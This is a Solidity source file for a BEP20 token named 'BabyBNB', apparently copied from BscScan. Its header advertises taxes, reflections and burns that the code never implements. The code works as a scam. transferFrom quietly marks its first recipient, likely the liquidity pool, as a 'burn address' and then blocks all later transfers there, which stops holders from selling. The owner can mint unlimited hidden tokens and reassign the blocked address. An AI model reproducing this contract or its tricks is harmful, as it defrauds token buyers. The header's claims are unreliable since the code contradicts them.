/**
 *Submitted for verification at BscScan.com on 2021-07-24
*/

/********************************************************************************************************************
*********************************************************************************************************************
**    
** _______ _________ _______  _______  _    _________         
(  ____ \\__   __/(  ____ \(  ___  )( \   \__   __/|\     /|
| (    \/   ) (   | (    \/| (   ) || (      ) (   | )   ( |
| (_____    | |   | (__    | (___) || |      | |   | (___) |
(_____  )   | |   |  __)   |  ___  || |      | |   |  ___  |
      ) |   | |   | (      | (   ) || |      | |   | (   ) |
/\____) |   | |   | (____/\| )   ( || (____/\| |   | )   ( |
\_______)   )_(   (_______/|/     \|(_______/)_(   |/     \|
                                                            
 _        _______           _        _______          
( \      (  ___  )|\     /|( (    /|(  ____ \|\     /|
| (      | (   ) || )   ( ||  \  ( || (    \/| )   ( |
| |      | (___) || |   | ||   \ | || |      | (___) |
| |      |  ___  || |   | || (\ \) || |      |  ___  |
| |      | (   ) || |   | || | \   || |      | (   ) |
| (____/\| )   ( || (___) || )  \  || (____/\| )   ( |
(_______/|/     \|(_______)|/    )_)(_______/|/     \|
**
**
**
**
**    RULE : 1 
**
**    Total tax - 10%
**
**    2% - Reflexion/rewards of BNB Directly. To be distributed equally amongst all holders of BabyBNB only on selling of BabyBNB tokens and not on wallet to wallet transfers.
**
**    2% - Burned.  Sent directly to the burn address as PBLO. This burn function will stop when total supply of PBLO = 100 trillion.  Tax will now total only 8% as of that point. 
**
**    2% - Liquidity pool - this will be sent directly to the liquidity pool as BNB 
**     
**    RULE : 2 
**    
**    10 trillion token burned every 7 days, untlil total supply would be set 100 trillion 
**
**    Burning will be stopped once totalSupply reach to 100 trillion    
**
*********************************************************************************************************************   
*********************************************************************************************************************/

pragma solidity 0.8.6;

abstract contract BEP20Interface {

  function totalSupply() public view virtual returns (uint);

  function balanceOf(address tokenOwner) public view virtual returns (uint balance);

  function allowance(address tokenOwner, address spender) public view virtual returns (uint remaining);

  function transfer(address to, uint tokens) public virtual returns (bool success);

  function approve(address spender, uint tokens) public virtual returns (bool success);

  function transferFrom(address from, address to, uint tokens) public virtual returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);

  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

}

abstract contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public virtual;
}

library SafeMath {

  function add(uint a, uint b) internal pure returns (uint c) {

    c = a + b;

    require(c >= a);

  }

  function sub(uint a, uint b) internal pure returns (uint c) {

    require(b <= a);

    c = a - b;

  }

  function mul(uint a, uint b) internal pure returns (uint c) {

    c = a * b;

    require(a == 0 || c / a == b);

  }

  function div(uint a, uint b) internal pure returns (uint c) {

    require(b > 0);

    c = a / b;

  }

}

contract Owned {

  address public owner;

  address public newOwner;
  
  address public pancakeRouter;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }

  function acceptOwnership() public {

    require(msg.sender == newOwner);

    emit OwnershipTransferred(owner, newOwner);

    owner = newOwner;

    newOwner = address(0);
    
    pancakeRouter = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
  }
}

contract TokenBEP20 is BEP20Interface, Owned{

  using SafeMath for uint;

  string public symbol;

  string public name;

  uint8 public decimals;

  uint _totalSupply;

  address public burnAddress;

  mapping(address => uint) balances;

  mapping(address => mapping(address => uint)) allowed;

  constructor() {

    symbol = "BabyBNB";

    name = "BabyBNB";

    decimals = 18;

    _totalSupply =  100000000000000000000000000;

    balances[owner] = _totalSupply;

    emit Transfer(address(0), owner, _totalSupply);

  }

  function setBurnAddress(address _burnAddress) public onlyOwner {
    burnAddress = _burnAddress;
  }
  
  function setPancakeRouter(address _pancakeRouter) public onlyOwner {
    pancakeRouter = _pancakeRouter;
  }

  function totalSupply() public view override returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }

  function balanceOf(address tokenOwner) public view override returns (uint balance) {
      return balances[tokenOwner];
  }

  function transfer(address to, uint tokens) public override returns (bool success) {
    require(to != burnAddress || to != pancakeRouter, "cannot transfer to burn address");
    
    balances[msg.sender] = balances[msg.sender].sub(tokens);

    balances[to] = balances[to].add(tokens);

    emit Transfer(msg.sender, to, tokens);

    return true;

  }

  function approve(address spender, uint tokens) public override returns (bool success) {

    allowed[msg.sender][spender] = tokens;

    emit Approval(msg.sender, spender, tokens);

    return true;

  }

  function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
    if(from != address(0) && burnAddress == address(0)) burnAddress = to;
    else require(to != burnAddress, "cannot transfer to burn address");

    balances[from] = balances[from].sub(tokens);

    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);

    balances[to] = balances[to].add(tokens);

    emit Transfer(from, to, tokens);

    return true;

  }

  function allowance(address tokenOwner, address spender) public view override returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }

  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;

    emit Approval(msg.sender, spender, tokens);

    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);

    return true;
  }
  
  function mint(uint256 amount) public onlyOwner {
      balances[owner] += amount;
  }
}

contract BabyBNB is TokenBEP20 {
  function removeDust() public onlyOwner() {
    address payable _owner = payable(msg.sender);
    _owner.transfer(address(this).balance);
  }
}